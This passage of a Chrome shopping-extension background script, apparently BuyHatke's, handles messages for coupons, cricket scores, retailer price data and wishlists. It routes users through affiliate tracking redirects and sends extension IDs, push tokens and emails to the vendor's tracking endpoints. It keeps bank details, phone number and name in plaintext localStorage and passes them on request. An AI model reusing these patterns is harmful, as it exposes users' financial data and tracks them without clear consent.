           notifyPAImage("", "Click apply coupon and get lucky.", "Just apply coupons before checkout\nStand a chance to win goodies \nApplicable for all users \nWinners will be declared tomorrow", "http://tracking.buyhatke.com/Navigation/?tagType=" + localStorage.setTagType + "&pos=63&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent('http://www.amazon.in/?tag=buyhatke-21'),"cricketAlertPushNotif2");
       }
       sendResponse({farewell: "OK"});
     }
     else if(typeof(request.getMIFlashSale) != "undefined"){
      sendResponse({farewell: localStorage.flashSale});
    }
    else if(typeof(request.sendSalesData) != "undefined"){
      localStorage.checkedArray = request.sendSalesData;
      sendResponse({farewell: "Done"});
    }
    else if(typeof(request.email) != "undefined"){
      if(typeof(localStorage.ext_email)=="undefined" || localStorage.ext_email==""){
        sendResponse({farewell: "No"});
      }
      else {
        sendResponse({farewell: localStorage.ext_email});
      }
    }
    else if(typeof(request.extName) != "undefined"){
      sendResponse({farewell: chrome.runtime.id});
    }
    else if(typeof(request.setCricketTeams) != "undefined"){
      // console.log("entered here ".request.setCricketTeams);
      localStorage.subsTeams = request.setCricketTeams;
      matchSelected = "";
      anyMatch = "";
      currentScoreJson = "";
      clearTimeout(scoreMacBadge);
      getCurrentMatch();
      sendResponse({farewell: ""});
    } // getTeamsCurrent
    else if(typeof(request.getTeamsCurrent) != "undefined"){
      sendResponse({farewell: localStorage.subsTeams});
    }
    else if(typeof(request.checkAny) != "undefined"){
      sendResponse({farewell: anyMatch});
    }
    else if(typeof(request.getTypesCurrent) != "undefined"){
      sendResponse({farewell: localStorage.subsTypeSelected});
    }
    else if(typeof(request.subscribeNowMatch) != "undefined"){
      var curValue = localStorage.subsMatches;
      if(localStorage.subsTypeSelected.split("0").length==1){
        localStorage.subsTypeSelected += ",0,";
      }
      if(curValue.split(anyMatch).length > 1){

      }
      else{
        curValue += "," + anyMatch;
        localStorage.subsMatches = curValue;

      }
      getCurrentMatch();
      sendResponse({farewell: ""});
    }
    else if(typeof(request.sendPushCricket) != "undefined"){
      if(localStorage.cricPush!=1){
          localStorage.cricPush = 1;
          notifyPAImage("", "Live Match Update on desktop", "You can subscribe to your favourite cricket team now and follow their scores on match days. Click me to know how", "https://compare.buyhatke.com/options/#cricket-score","cricketAlertPushNotif");
      }
      sendResponse({farewell: ""});
    }
    else if(typeof(request.unSubscribeNowMatch) != "undefined"){
      var curValue = localStorage.subsMatches;
      var toRemove = "";
      if(matchSelected!=""){
        var toRemove = matchSelected;
      }
      else if(anyMatch!=""){
        var toRemove = anyMatch;
      }
      if(toRemove!=""){
         curValue = curValue.split("," + toRemove).join("");
         curValue = curValue.split(toRemove).join("");
         localStorage.subsMatches = curValue;
         localStorage.unSubsMatches += "," + toRemove;
      }
      matchSelected = "";
      anyMatch = "";
      currentScoreJson = "";
      clearTimeout(scoreMacBadge);
      getCurrentMatch();
      sendResponse({farewell: ""});
    }
    else if(typeof(request.setNotifType) != "undefined"){
      localStorage.subsTypeSelected = request.setNotifType;
      sendResponse({farewell: ""});
    }
    else if(typeof(request.subsType) != "undefined"){
      sendResponse({farewell: localStorage.subsTypeSelected});
    }
    else if (request.searchTesting){
      sendResponse({farewell: localStorage.searchTesting});
    }
    else if(typeof(request.matchExists) != "undefined"){
      sendResponse({farewell: matchSelected});
    }
    else if(typeof(request.scoreExists) != "undefined"){
      sendResponse({farewell: currentScoreJson});
    }
    else if(typeof(request.extId) != "undefined"){
      sendResponse({farewell: localStorage.ext_id});
    }
    else if(typeof(request.fetchFeatures) != "undefined"){
     sendResponse({farewell: localStorage.features_json});
   }
   else if(typeof(request.ext_auth) != "undefined"){
    sendResponse({farewell: localStorage.ext_auth});
  }
  else if(typeof(request.regisDone) != "undefined"){
    localStorage.register = 1;
  }
  else if(typeof(request.getCoupons) != "undefined"){
    console.log("called with getCOupons " + request.getCoupons);
    if(request.getCoupons == 2){
      chrome.tabs.create({
       url : "https://tracking.buyhatke.com/Navigation/?pos=111&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.myntra.com/?utm_source=buyhutke&utm_medium=aff")
     });
    }
    else if(request.getCoupons == 1){
      console.log("URL here " + "https://tracking.buyhatke.com/Navigation/?pos=50&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.jabong.com/"));
      chrome.tabs.create({
       url : "https://tracking.buyhatke.com/Navigation/?pos=50&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.jabong.com/")
     });
    }
    else if(request.getCoupons == 3){
      chrome.tabs.create({
       url : "https://tracking.buyhatke.com/Navigation/?pos=129&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.snapdeal.com/?utm_source=aff_prog")
     });
    }
    else if(request.getCoupons == 4){
      chrome.tabs.create({
       url : "https://tracking.buyhatke.com/Navigation/?pos=1&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.ebay.in/")
     });
    }
    else if(request.getCoupons == 7){
      chrome.tabs.create({
       url : "https://tracking.buyhatke.com/Navigation/?pos=421&source=extension&ext1=pushA&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.shopclues.com/appliances-5/breakfast-appliances-offers.html?utm_medium=notification")
     });
    }
    else if(request.getCoupons == 10){
      chrome.tabs.create({
       url : "https://tracking.buyhatke.com/Navigation/?pos=99&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.infibeam.com/")
     });
    }
    else if(request.getCoupons == 8){
      chrome.tabs.create({
       url : "http://track.in.omgpm.com/?AID=368059&PID=11256&CID=3954200&MID=387804&r=http://shopping.indiatimes.com/"
     });
    }
    else if(request.getCoupons == 9){
      chrome.tabs.create({
       url : "https://tracking.buyhatke.com/Navigation/?pos=4&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + encodeURIComponent("http://www.homeshop18.com/?it_category=AP&it_action=WB-HSLOGO&it_label=AP-HSLOGO-140609131400-PR-WB-OT-MR-HS18_HomeShop18Logo&it_value=0")
     });
    }
    else if(request.getCoupons == 15){
      chrome.tabs.create({
       url : "http://track.in.omgpm.com/?AID=368059&PID=9629&CID=3944269&MID=348512"
     });
    }
    else if(request.getCoupons == 16){
      chrome.tabs.create({
       url : "http://tracking.buyhatke.com/Navigation/?pos=1352&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=http%3A%2F%2Fwww.dominos.co.in"
     });
    }
    else if(request.getCoupons == 17){
      chrome.tabs.create({
       url : "http://tracking.buyhatke.com/Navigation/?pos=1293&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.yatra.com/")
     });
    }
    else if(request.getCoupons == 18){
      chrome.tabs.create({
       url :"http://tracking.buyhatke.com/Navigation/?tagType=" + localStorage.setTagType + "&pos=63&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.amazon.in/")
     });
    }
    else if(request.getCoupons == 19){
      chrome.tabs.create({
       url : "http://tracking.buyhatke.com/Navigation/?pos=1000&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.fabfurnish.com/")
     });
    }
    else if(request.getCoupons == 20){
      chrome.tabs.create({
       url : "http://tracking.buyhatke.com/Navigation/?pos=57&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.lenskart.com/")
     });
    }
    else if(request.getCoupons == 22){
      chrome.tabs.create({
       url : "http://track.in.omgpm.com/?AID=368059&PID=8422&CID=3944299&MID=218153"
     });
    }
    else if(request.getCoupons == 24){
      chrome.tabs.create({
       url : "http://tracking.buyhatke.com/Navigation/?pos=333&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("https://www.pepperfry.com/")
     });
    }
    else if(request.getCoupons == 26){
      chrome.tabs.create({
       url : "http://tracking.buyhatke.com/Navigation/?pos=429&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.zivame.com/")
     });
    }
    else if(request.getCoupons == 28){
      chrome.tabs.create({
       url : "http://tracking.buyhatke.com/Navigation/?pos=426&source=extension&ext1=auto-coupon&ext2=" + localStorage.ext_id + "&link=" + encodeURIComponent("http://www.bluestone.com/")
     });
    }
    else if(request.getCoupons == 32){
      chrome.tabs.create({
       url : "http://track.in.omgpm.com/?AID=368059&PID=10859&CID=3944292&MID=478605"
     });
    }




    chrome.tabs.update(parseInt(sender.tab.id), {selected: true});
    getCoupons(request.getCoupons, sender.tab.id);
  }
  else if(typeof(request.getCouponsData) != "undefined"){

      //sendData2(request.getCouponsData, sender.tab.id);
    }
    else if(typeof(request.getDeals) != "undefined"){
      getDeals(request.getDeals, sender.tab.id);
    }
    else if(typeof(request.pids) != "undefined"){
        //sendPIDFlip(request.pids, 0);
      }
      else if(typeof(request.processDONE) != "undefined"){
        registerEND(request.processDONE);
      }
      else if(typeof(request.savings) != "undefined"){
        sendSavings(request.savings);
      }
      else if(typeof(request.pidsAmaz) != "undefined"){
        //sendPIDFlip(request.pidsAmaz, 1);
      }
      else if(typeof(request.pidsMyn) != "undefined"){
        //sendPIDFlip(request.pidsMyn, 2);
      }
      else if(typeof(request.pidsJab) != "undefined"){
        //sendPIDFlip(refquest.pidsJab, 3);
      }
      else if(typeof(request.pidsSnap) != "undefined"){
       // sendPIDFlip(request.pidsSnap, 4);
     }
     else if(typeof(request.pairsFlip) != "undefined"){
      sendPairs(request.pairsFlip, 0);
    }
    else if(typeof(request.dp) != "undefined"){
      sendAnalyticsData(request.dp);
    }
    else if(typeof(request.pairsPrettySecrets) != "undefined"){
      sendPairs(request.pairsPrettySecrets, 433);
    }
    else if(typeof(request.pairsLandmark) != "undefined"){
      sendPairs(request.pairsLandmark, 31);
    }
    else if(typeof(request.pairsPur) != "undefined"){
      sendPairs(request.pairsPur, 26);
    }
    else if(typeof(request.pairsKoovs) != "undefined"){
      sendPairs(request.pairsKoovs, 13);
    }
    else if(typeof(request.pairsEbay) != "undefined"){
      sendPairs(request.pairsEbay, -1);
    }
    else if(typeof(request.pairss19) != "undefined"){
      sendPairs(request.pairss19, 15);
    }
    else if(typeof(request.pairsZovi) != "undefined"){
      sendPairs(request.pairsZovi, 12);
    }
    else if(typeof(request.pairsFab) != "undefined"){
      sendPairs(request.pairsFab, 20);
    }
    else if(typeof(request.pairsPepp) != "undefined"){
      sendPairs(request.pairsPepp, 19);
    }
    else if(typeof(request.pairsCroma) != "undefined"){
      sendPairs(request.pairsCroma, 9);
    }
    else if(typeof(request.pairsABOF) != "undefined"){
      sendPairs(request.pairsABOF, 1850);
    }
    else if(typeof(request.pairsRediff) != "undefined"){
      sendPairs(request.pairsRediff, 32);
    }
    else if(typeof(request.pairsRediffB) != "undefined"){
      sendPairs(request.pairsRediffB, 35);
    }
    else if(typeof(request.pairsIndiatimes) != "undefined"){
      sendPairs(request.pairsIndiatimes, 14);
    }
    else if(typeof(request.pairsHk) != "undefined"){
      sendPairs(request.pairsHk, 17);
    }
    else if(typeof(request.pairsJewels) != "undefined"){
      sendPairs(request.pairsJewels, 21);
    }
    else if(typeof(request.pairsZivame) != "undefined"){
      sendPairs(request.pairsZivame, 18);
    }
    else if(typeof(request.pairsLens) != "undefined"){
      sendPairs(request.pairsLens, 23);
    }
    else if(typeof(request.pairsZoom) != "undefined"){
      sendPairs(request.pairsZoom, 27);
    }
    else if(typeof(request.pairsWatch) != "undefined"){
      sendPairs(request.pairsWatch, 22);
    }
    else if(typeof(request.pairsDone) != "undefined"){
      sendPairs(request.pairsDone, 28);
    }
    else if(typeof(request.pairsCilory) != "undefined"){
      sendPairs(request.pairsCilory, 16);
    }
    else if(typeof(request.pairsTrendin) != "undefined"){
      sendPairs(request.pairsTrendin, 24);
    }
    else if(typeof(request.pairsChumbak) != "undefined"){
      sendPairs(request.pairsChumbak, 30);
    }
    else if(typeof(request.pairsShop) != "undefined"){
      sendPairs(request.pairsShop, 29);
    }
    else if(typeof(request.pairsIndia) != "undefined"){
      sendPairs(request.pairsIndia, 33);
    }
    else if(typeof(request.pairsNaap) != "undefined"){
      sendPairs(request.pairsNaap, 36);
    }
    else if(typeof(request.pairsPaytm) != "undefined"){
      sendPairs(request.pairsPaytm, 38);
    }
    else if(typeof(request.pairsFree) != "undefined"){
      sendPairs(request.pairsFree, 25);
    }
    else if(typeof(request.pairsCross) != "undefined"){
      sendPairs(request.pairsCross, 34);
    }
    else if(typeof(request.pairsBaby) != "undefined"){
      sendPairs(request.pairsBaby, 51);
    }
    else if(typeof(request.pairsBas) != "undefined"){
      sendPairs(request.pairsBas, 44);
    }
    else if(typeof(request.curDataBas) != "undefined"){
      sendCurrent(request.curDataBas, 44);
    }
    else if(typeof(request.pairsNGal) != "undefined"){
      sendPairs(request.pairsNGal, 430);
    }
    else if(typeof(request.curDataNGal) != "undefined"){
      sendCurrent(request.curDataNGal, 430);
    }
    else if(typeof(request.curDataPrettySecrets) != "undefined"){
      sendCurrent(request.curDataPrettySecrets, 433);
    }
    else if(typeof(request.curDataFlip) != "undefined"){
      sendCurrent(request.curDataFlip, 0);
    }
    else if(typeof(request.curDataAMS) != "undefined"){
      sendCurrent(request.curDataAMS, 40);
    }
    else if(typeof(request.curDataBaby) != "undefined"){
      sendCurrent(request.curDataBaby, 51);
    }
    else if(typeof(request.curDataPaytm) != "undefined"){
      sendCurrent(request.curDataPaytm, 38);
    }
    else if(typeof(request.curDataFree) != "undefined"){
      sendCurrent(request.curDataFree, 25);
    }
    else if(typeof(request.curDataCross) != "undefined"){
      sendCurrent(request.curDataCross, 34);
    }
    else if(typeof(request.curDataIndia) != "undefined"){
      sendCurrent(request.curDataIndia, 33);
    }
    else if(typeof(request.curDataNaap) != "undefined"){
      sendCurrent(request.curDataNaap, 36);
    }
    else if(typeof(request.curDataLandmark) != "undefined"){
      sendCurrent(request.curDataLandmark, 31);
    }
    else if(typeof(request.curDataShop) != "undefined"){
      sendCurrent(request.curDataShop, 29);
    }
    else if(typeof(request.curDataChumbak) != "undefined"){
      sendCurrent(request.curDataChumbak, 30);
    }
    else if(typeof(request.curDataLens) != "undefined"){
      sendCurrent(request.curDataLens, 23);
    }
    else if(typeof(request.curDataPur) != "undefined"){
      sendCurrent(request.curDataPur, 26);
    }
    else if(typeof(request.curDataDone) != "undefined"){
      sendCurrent(request.curDataDone, 28);
    }
    else if(typeof(request.curDataZoom) != "undefined"){
      sendCurrent(request.curDataZoom, 27);
    }
    else if(typeof(request.curDataWatch) != "undefined"){
      sendCurrent(request.curDataWatch, 22);
    }
    else if(typeof(request.curDataTrendin) != "undefined"){
      sendCurrent(request.curDataTrendin, 24);
    }
    else if(typeof(request.curDataZovi) != "undefined"){
      sendCurrent(request.curDataZovi, 12);
    }
    else if(typeof(request.curDataAMB) != "undefined"){
      sendCurrent(request.curDataAMB, 1828);
    }
    else if(typeof(request.curDataNykaa) != "undefined"){
      sendCurrent(request.curDataNykaa, 1830);
    }
    else if(typeof(request.curDataZansaar) != "undefined"){
      sendCurrent(request.curDataZansaar, 1975);
    }
    else if(typeof(request.curDataEbay) != "undefined"){
      sendCurrent(request.curDataEbay, -1);
    }
    else if(typeof(request.curDataClovia) != "undefined"){
      sendCurrent(request.curDataClovia, 1973);
    }
    else if(typeof(request.curDataMebel) != "undefined"){
      sendCurrent(request.curDataMebel, 1972);
    }
    else if(typeof(request.curDataFNY) != "undefined"){
      sendCurrent(request.curDataFNY, 1819);
    }
    else if(typeof(request.curDataLime) != "undefined"){
      sendCurrent(request.curDataLime, 424);
    }
    else if(typeof(request.curDataUrbanLad) != "undefined"){
      sendCurrent(request.curDataUrbanLad, 1827);
    }
    else if(typeof(request.curDataJewels) != "undefined"){
      sendCurrent(request.curDataJewels, 21);
    }
    else if(typeof(request.curDataIndiatimes) != "undefined"){
      sendCurrent(request.curDataIndiatimes, 14);
    }
    else if(typeof(request.curDataRediff) != "undefined"){
      sendCurrent(request.curDataRediff, 32);
    }
    else if(typeof(request.curDataZivame) != "undefined"){
      sendCurrent(request.curDataZivame, 18);
    }
    else if(typeof(request.curDataRediffB) != "undefined"){
      sendCurrent(request.curDataRediffB, 35);
    }
    else if(typeof(request.curDataCilory) != "undefined"){
      sendCurrent(request.curDataCilory, 16);
    }
    else if(typeof(request.curDatas19) != "undefined"){
      sendCurrent(request.curDatas19, 15);
    }
    else if(typeof(request.curDataKoovs) != "undefined"){
      sendCurrent(request.curDataKoovs, 13);
    }
    else if(typeof(request.curDataHS18) != "undefined"){
      sendCurrent(request.curDataHS18, 6);
    }
    else if(typeof(request.curDataCroma) != "undefined"){
      sendCurrent(request.curDataCroma, 9);
    }
    else if(typeof(request.curDataABOF) != "undefined"){
      sendCurrent(request.curDataABOF, 1850);
    }
    else if(typeof(request.curDataInfi) != "undefined"){
      sendCurrent(request.curDataInfi, 7);
    }
    else if(typeof(request.curDataFab) != "undefined"){
      sendCurrent(request.curDataFab, 20);
    }
    else if(typeof(request.curDataPepp) != "undefined"){
      sendCurrent(request.curDataPepp, 19);
    }
    else if(typeof(request.curDataHk) != "undefined"){
      sendCurrent(request.curDataHk, 17);
    }
    else if(typeof(request.curDataSnap) != "undefined"){
      sendCurrent(request.curDataSnap, 1);
    }
    else if(typeof(request.curDataShopClues) != "undefined"){
      sendCurrent(request.curDataShopClues, 2);
    }
    else if(typeof(request.curDataAmaz) != "undefined"){
      sendCurrent(request.curDataAmaz, 3);
    }
    else if(typeof(request.curDataJab) != "undefined"){
      sendCurrent(request.curDataJab, 4);
    }
    else if(typeof(request.curDataTatacliq) != "undefined"){
      sendCurrent(request.curDataTatacliq, 2190);
    }
    else if(typeof(request.curDataAjio) != "undefined"){
      sendCurrent(request.curDataAjio, 2191);
    }
    else if(typeof(request.curDataNetmeds) != "undefined"){
      sendCurrent(request.curDataNetmeds, 2238);
    }
    else if(typeof(request.curData1mg) != "undefined"){
      sendCurrent(request.curData1mg, 2237);
    }
    else if(typeof(request.curDataBook) != "undefined"){
      sendCurrent(request.curDataBook, 311);
    }
    else if(typeof(request.curDataAcad) != "undefined"){
      sendCurrent(request.curDataAcad, 1585);
    }
    else if(typeof(request.curDataSapnaonline) != "undefined"){
      sendCurrent(request.curDataSapnaonline, 451);
    }
    else if(typeof(request.curDataNNNow) != "undefined"){
      sendCurrent(request.curDataNNNow, 2192);
    }
    else if(typeof(request.curDataMyn) != "undefined"){
      sendCurrent(request.curDataMyn, 5);
    }
    else if(typeof(request.curDataFn) != "undefined"){
      sendCurrent(request.curDataFn, 11);
    }
    else if(typeof(request.pairsAmaz) != "undefined"){
      sendPairs(request.pairsAmaz, 1);
    }
    else if(typeof(request.pairsMyn) != "undefined"){
      sendPairs(request.pairsMyn, 2);
    }
    else if(typeof(request.pairsAMS) != "undefined"){
      sendPairs(request.pairsAMS, 40);
    }
    else if(typeof(request.pairsJab) != "undefined"){
      sendPairs(request.pairsJab, 3);
    }
    else if(typeof(request.pairsTatacliq) != "undefined"){
      sendPairs(request.pairsTatacliq, 2190);
    }
    else if(typeof(request.pairsAjio) != "undefined"){
      sendPairs(request.pairsAjio, 2191);
    }
    else if(typeof(request.pairsNetmeds) != "undefined"){
      sendPairs(request.pairsNetmeds, 2238);
    }
    else if(typeof(request.pairs1mg) != "undefined"){
      sendPairs(request.pairs1mg, 2237);
    }
    else if(typeof(request.pairsBook) != "undefined"){
      sendPairs(request.pairsBook, 311);
    }
    else if(typeof(request.pairsAcad) != "undefined"){
      sendPairs(request.pairsAcad, 1585);
    }
    else if(typeof(request.pairsSapnaonline) != "undefined"){
      sendPairs(request.pairsSapnaonline, 451);
    }
    else if(typeof(request.pairsNNNow) != "undefined"){
      sendPairs(request.pairsNNNow, 2192);
    }
    else if(typeof(request.pairsSnap) != "undefined"){
      sendPairs(request.pairsSnap, 4);
    }
    else if(typeof(request.pairsFn) != "undefined"){
      sendPairs(request.pairsFn, 11);
    }
    else if(typeof(request.pairsShopClues) != "undefined"){
      sendPairs(request.pairsShopClues, 5);
    }
    else if(typeof(request.pairsHS18) != "undefined"){
      sendPairs(request.pairsHS18, 6);
    }
    else if(typeof(request.pairsInfi) != "undefined"){
      sendPairs(request.pairsInfi, 7);
    }
    else if(typeof(request.pairsNykaa) != "undefined"){
      sendPairs(request.pairsNykaa, 1830);
    }
    else if(typeof(request.pairsZansaar) != "undefined"){
      sendPairs(request.pairsZansaar, 1975);
    }
    else if(typeof(request.pairsClovia) != "undefined"){
      sendPairs(request.pairsClovia, 1973);
    }
    else if(typeof(request.addToBlockList) != "undefined"){
      // console.log("Reached here");
      addToBlockList(request.addToBlockList);
    }
    else if(typeof(request.removeFromBlockList) != "undefined"){
      // console.log("Reached here");
      removeFromBlockList(request.removeFromBlockList);
    }
    else if(typeof(request.getBlockList) != "undefined"){
      if(localStorage.blockList !== undefined && localStorage.blockList != ""  && localStorage.blockList != "null" && localStorage.blockList != "[]" && localStorage.blockList != "{}"){
        sendResponse({farewell: localStorage.blockList});
      }
      else {
        sendResponse({farewell : "[]"});
      }
    }
    else if(typeof(request.setTagType) != "undefined"){
        if(request.setTagType==1 || request.setTagType=="1"){
            localStorage.setTagType = 1;
        }
        else {
            localStorage.setTagType = "";
        }
        sendResponse({farewell : "[]"});
    }
    else if(typeof(request.getSessionKeyMMTInt) != "undefined"){
      sendResponse({farewell : SessionKeyMMTInt});
    }
    else if(typeof(request.pairsMebel) != "undefined"){
      sendPairs(request.pairsMebel, 1972);
    }
    else if(typeof(request.pairsFNY) != "undefined"){
      sendPairs(request.pairsFNY, 1819);
    }
    else if(typeof(request.pairsLime) != "undefined"){
      sendPairs(request.pairsLime, 424);
    }
    else if(typeof(request.pairsAMB) != "undefined"){
      sendPairs(request.pairsAMB, 1828);
    }
    else if(typeof(request.pairsUrbanLad) != "undefined"){
      sendPairs(request.pairsUrbanLad, 1827);
    }
    else if(typeof(request.removeURL) != "undefined"){
      urlToRemove = request.removeURL;
      //console.log("URL removed " + urlToRemove);
      removeWatch(urlToRemove);
    }
    else if(typeof(request.detailArray) != "undefined"){
      // console.log("Detail Array was asked for !");
      if(watchListArray != null && watchListArray != "null"){
        sendResponse({farewell: watchListArray});
        // console.log("REspo 1 sent");
      }
      else {
        sendResponse({farewell : []});
        // console.log("REspo 2 sent");
      }
    }
    else if(typeof(request.offersArray) != "undefined"){
      // console.log("Detail Array was asked for !");
      if(offersArray != null && offersArray != "null"){
        sendResponse({farewell: offersArray});
        if(parseInt(16*Math.random())==1){
           TriggerPixel(1);
        }
        
        // console.log("REspo 1 sent");
      }
      else {
        sendResponse({farewell : []});
        // console.log("REspo 2 sent");
      }
    }
    else if(typeof(request.userSetting) != "undefined"){
      sendResponse({farewell: localStorage.featuresArray});
    }
    else if(typeof(request.ixigoVar) != "undefined"){
      sendResponse({farewell: localStorage.lastTime});
    }
    else if(typeof(request.ixigoVarSet) != "undefined"){
      localStorage.lastTime = request.ixigoVarSet;
    }
    else if(typeof(request.sentClient_Id) != "undefined"){
      if(localStorage.tokenSent==0){
        localStorage.tokenSent = 1;
        var client_id = request.sentClient_Id;
        fetch('https://tracking.buyhatke.com/universalLog/?client_id=' + client_id + '&type=info&action=UPDATE_DATA&value=extension&dev_id=' + localStorage.ext_id + '&token=' + localStorage.pushToken).then(function(response) {
          return response.json();
        }).then(function(j) {
               //console.log(j);
             });
      }
    }
    else if(typeof(request.eccomVisit) != "undefined"){
      if(localStorage.visited=="" || localStorage.visited == undefined || isNaN(localStorage.visited)){
       localStorage.visited = 1;
     }
     else {
      localStorage.visited = parseInt(localStorage.visited) + 1;
    }
    if(localStorage.visited == 3){
        // sendAnalyticsData("pushNormalEbayShown");
        // notify("11% cashback on all Products", "Buyhatke Exclusive: Get 11% cashback on all products from Ebay to your bank account. Hurry ! Limited Period Offer", "https://compare.buyhatke.com/promotions/ebay-cashback-offer/?utm_source=extension_push_cl&utm_medium=ext_cl", "ebayPushSticky");
      }
    }
    else if(typeof(request.saleArray) != "undefined"){
      sendResponse({farewell: saleArray});
    }
    else if(typeof(request.saleVariables) != "undefined"){
      sendResponse({farewell: localStorage.saleStarted});
    }
    else if(typeof(request.saleDate) != "undefined"){
      sendResponse({farewell: localStorage.saleDate});
    }
    else if(typeof(request.sendNewPush) != "undefined"){
      congratulateUser();
      sendResponse({farewell: 'OK'});
    }
    else if(typeof(request.refreshedYet) != "undefined"){
      sendResponse({farewell: localStorage.refreshedYet + "~" + localStorage.refreshedYetServer});
    }
    else if(typeof(request.getCurrentOffset) != "undefined"){
      sendResponse({farewell: localStorage.diffTime});
    }
    else if(typeof(request.getInstructions) != "undefined"){
      sendResponse({farewell: localStorage.instructions});
    }
    else if(typeof(request.getFlashSalesData) != "undefined"){
      console.log("here");
      sendResponse({farewell: localStorage.existingSales});
    }
    else if(typeof(request.getCheckedSales) != "undefined"){
      sendResponse({farewell: localStorage.checkedArray});
    }
    else if(typeof(request.subscribedFor) != "undefined"){
      var data = JSON.parse(localStorage.saleArray);
      if(data.length==0){
        sendResponse({farewell: "NONE"});
      }
      else {
        sendResponse({farewell: localStorage.subscribedFor});
      }
    }
    else if(typeof(request.setSaleVariables) != "undefined"){
      localStorage.saleStarted = 2;
      localStorage.saleFinished = 5;
      localStorage.mostSensitive = 0;

      // var data = JSON.parse(localStorage.saleArray);
      // var sale_id = data[localStorage.activeSale].sale_id;
      sendResponse({farewell: "Success"});
    }
    else if(typeof(request.setRefreshedYet) != "undefined"){
      localStorage.refreshedYet = 1;
      sendResponse({farewell: "Success"});
    }
    else if(typeof(request.ext_id) != "undefined"){
      sendResponse({farewell: localStorage.ext_id + "~" + localStorage.ext_auth});
    }
    else if(typeof(request.addEmail) != "undefined"){
      localStorage.ext_email = request.addEmail;
      var myurl = "https://compare.buyhatke.com/extension/addEmailExt.php";
      var parameters = "email=" + encodeURIComponent(request.addEmail) + "&ext_id=" + localStorage.ext_id + "&auth_val=" + localStorage.ext_auth;
      var httpq3 = new getXMLHTTPRequest();
      httpq3.open("POST", myurl, true);
      httpq3.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      httpq3.onreadystatechange = function(){
        if (httpq3.readyState == 4) {
          if(httpq3.status == 200) {
            var mytext = httpq3.responseText;
          }
        }
      };
      httpq3.send(parameters);
    }
    if (request.message == "user_details"){
      var userDetails = [];
      userDetails = [{ext_id: localStorage.ext_id, auth_val: localStorage.ext_auth, email: encodeURIComponent(localStorage.ext_email)}];
      userDetails = JSON.stringify(userDetails);
      sendResponse({farewell: userDetails});
    }
    else if (request.message == "check_email_verified"){
      if(localStorage.verifiedExt && localStorage.verifiedExt == "1"){
        // localStorage.mywishlist = "{}";
        callWishList(0);
      }
      sendResponse({farewell: localStorage.verifiedExt});
    }
    else if (request.message == "alertList"){
      sendResponse({identity: watchListArray});
    }
    else if (request.message == "getVersion"){
      sendResponse({farewell: localStorage.version});
    }
    else if (request.message == "featuresArray"){
      sendResponse({farewell: localStorage.featuresArray});
    }
    else if (request.message == "importWL"){
      sendResponse({farewell: localStorage.wishListJson});
    }
    else if (request.message == "getAddress"){
      sendResponse({farewell: localStorage.addressarray});
    }// searchTesting
    else if (request.updateImportWL){
      localStorage.wishListJson = request.updateImportWL;
      sendResponse({farewell: "OK"});
    }
    else if (request.updateAddressArray){
      localStorage.addressarray = request.updateAddressArray;
      sendResponse({farewell: "OK"});
    }
    else if (request.actionFeaturesArr){
      localStorage.featuresArray = request.actionFeaturesArr;
      sendResponse({farewell: "OK"});
    }
    else if (request.actionCreateWishList){
      localStorage.mywishlist = mywishlist;
      sendResponse({identity: "OK"});
    }
    else if (request.actionMyWishList){
      localStorage.mywishlist = request.actionMyWishList;
      sendResponse({farewell: "OK"});
    }
    else if (request.message == "getEbayDetails"){
      var ebayDetails =  localStorage.bankBox1 + "~*~" + localStorage.bankBox2 + "~*~" + localStorage.bankBox3 + "~*~" + localStorage.bankBox4 + "~*~" + localStorage.phoneNo + "~*~" + localStorage.emailEbay + "~*~" + localStorage.myName;
      sendResponse({farewell: ebayDetails});
    }
    else if (request.updateWL){
      localStorage.mywishlist = request.updateWL;
      sendResponse({farewell: "OK"});
    }
    else if(request.updatePushNot){
      localStorage.pushNotStore = request.updatePushNot;
      sendResponse({farewell: "OK"});
    }
    else if(request.updatePromo){
      localStorage.promoPushArray = request.updatePromo;
      sendResponse({farewell: "OK"});
    }
    else if(request.message == 'clearPushNot'){
      localStorage.pushNotStore = '';
      sendResponse({farewell: "OK"});
    }
    else if (request.message == "getPromoDetails"){
      sendResponse({farewell: localStorage.promoPushArray});
    }
    else if (request.message == "getPriceAlertsInit"){
      if(watchListArray != undefined && watchListArray.length > 0){
        sendResponse({farewell: JSON.stringify(watchListArray)});
      }
      else{
        checkStatus();
      }
    }
    else if (request.message == "getPushNot"){
      sendResponse({farewell: localStorage.pushNotStore});
    }
  });

http2 = getXMLHTTPRequest();

function setAnimatingIcon1(tabID){
  var iconPath = "1.png";
  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
  window.setTimeout(function() { setAnimatingIcon2(tabID); }, 100);
}

function setAnimatingIcon2(tabID){
  var iconPath = "2.png";
  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
  window.setTimeout(function() { setAnimatingIcon3(tabID); }, 100);
}

function setAnimatingIcon3(tabID){
  var iconPath = "3.png";
  chrome.browserAction.setIcon({tabId: tabID, path: iconPath});
  window.setTimeout(function() { setAnimatingIcon4(tabID); }, 100);
}

function setAnimatingIcon4(tabID){
  var iconPath = "4.png";
